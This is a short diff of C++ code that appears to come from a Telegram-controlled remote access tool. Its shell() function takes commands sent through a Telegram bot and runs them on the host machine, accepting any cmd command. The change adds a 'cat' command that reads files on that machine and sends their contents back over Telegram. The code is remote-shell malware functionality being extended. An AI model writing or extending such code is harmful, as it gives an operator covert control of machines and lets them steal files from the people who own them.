@@ -569,7 +569,7 @@ void SendFile(std::string path) {
 }
 
 void shell(std::string) {
-    telegram::SendText("it's just simple shell\n usage:\ncd - change directory\nls - list files in directory\nquit - guess what\n you can also use every command that is avaiable in cmd\n *BE CAREFUL!* when you launch something that doesn't exit itself like cmd.exe then you lost this istance since reboot:(");
+    telegram::SendText("it's just simple shell\n usage:\ncat - shows what's inside of a file\ncd - change directory\nls - list files in directory\nquit - guess what\n you can also use every command that is avaiable in cmd\n *BE CAREFUL!* when you launch something that doesn't exit itself like cmd.exe then you lost this istance since reboot:(");
     telegram::SendText("Current Directory: " + fs::current_path().generic_string());
     int LastMessageId = -1;
 
@@ -605,6 +605,11 @@ void shell(std::string) {
         
         if (pm.ID == "ls") {
             ListOfFiles(command.substr(2, command.size()));
+            continue;
+        }
+
+        if (pm.ID == "cat") {
+            cat(pm.command);
             continue;
         }
        
